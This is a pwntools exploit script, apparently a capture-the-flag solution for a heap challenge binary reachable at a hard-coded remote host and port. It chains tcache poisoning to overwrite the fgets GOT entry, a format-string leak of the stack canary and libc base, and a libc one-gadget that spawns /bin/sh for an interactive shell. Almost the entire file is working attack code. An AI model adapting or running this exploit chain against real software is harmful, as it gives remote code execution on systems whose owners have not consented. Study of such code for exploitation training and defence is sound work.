#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys
import time
from ctypes import CDLL
import ctypes

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/chall"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "34.70.212.151", 8001
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def get_heap_size(sz=0x18):
    malloc = cdll.malloc
    malloc.argtypes = [ctypes.c_size_t]
    malloc.restype = ctypes.c_void_p

    ptr = malloc(sz)
    allocated_sz = ctypes.cast(ptr - ctypes.sizeof(ctypes.c_size_t), ctypes.POINTER(ctypes.c_size_t))[0] & ~0xF

    return allocated_sz


def add(idx, sz=0x18):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b">> ", str(idx).encode())
    io.sendlineafter(b">> ", str(sz).encode())
    print("ADDED")

def change_sz(idx, new_sz=0x18):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b">> ", str(idx).encode())
    io.sendlineafter(b">> ", str(new_sz).encode())
    print("CHANGED", hex(new_sz))

def delete(idx):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b">> ", str(idx).encode())
    print("DELETED", idx)

def edit(idx, data=b"AAAA", send_data=True):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b">> ", str(idx).encode())
    if send_data == True:
        io.sendlineafter(b">> ", data)
        print("EDITED")

def exploit(io, libc=null, cdll=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + """
            b *edit+0xb9
            """
            gdb.attach(io, gdbscript=cmd)
    
    cdll.srand(int(time.time()))
    allocated_count = cdll.rand() % 10
    heap_size = [cdll.rand() % 0x200 for _ in range(allocated_count)]
    assert len(heap_size) > 2

    for sz in heap_size:
        print(hex(sz), hex(get_heap_size(sz)))

    add(0, 0x50-8)
    add(1, 0x50-8)
    add(2, 0x50-8)

    delete(2)
    delete(1)
    delete(0)

    PUTS_GOT_PLT = 0x401040
    FGETS_PLT = 0x401080
    TIME_GOT_PLT = 0x401090
    MALLOC_GOT_PLT = 0x4010a0
    edit(0, p64(elf.got["fgets"]))

    add(0, 0x50-8)
    p = b""
    p += "%{}c%15$hn".format(FGETS_PLT & 0xFFFF).encode() # repair fgets, also leak libc
    p += b"|%31$p|%33$p|"
    edit(0, p)
    
    add(1, 0x50-8)
    p = b""
    p += p64(elf.symbols["printf"])
    p += p64(0xdeadbeef)
    edit(1, p)
    
    edit(0, send_data=False)
    io.recvuntil(b"|")
    STACK_CANARY = int(io.recvuntil(b"|", drop=True), 16)
    LEAKED_LIBC = int(io.recvuntil(b"|", drop=True), 16)
    libc.address = LEAKED_LIBC - libc.symbols["__libc_start_main"] - 243
    print("STACK_CANARY                 :", hex(STACK_CANARY))
    print("LEAKED_LIBC                  :", hex(LEAKED_LIBC))
    print("libc.address                 :", hex(libc.address))

    p = b""
    p += p64(0xdeadc0de)
    p += p64(0xdeadc0de)
    p += p64(libc.address+0xe3b01) # one gadget
    edit(1, p)
    """
    0xe3b01 execve("/bin/sh", r15, rdx)
    constraints:
    [r15] == NULL || r15 == NULL
    [rdx] == NULL || rdx == NULL
    """
    
    add(0, 0) # trigger shell via one gadget

    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        # libc = ELF("___")
        
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
    libc = ELF("libc-2.31.so")
    cdll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    exploit(io, libc, cdll)
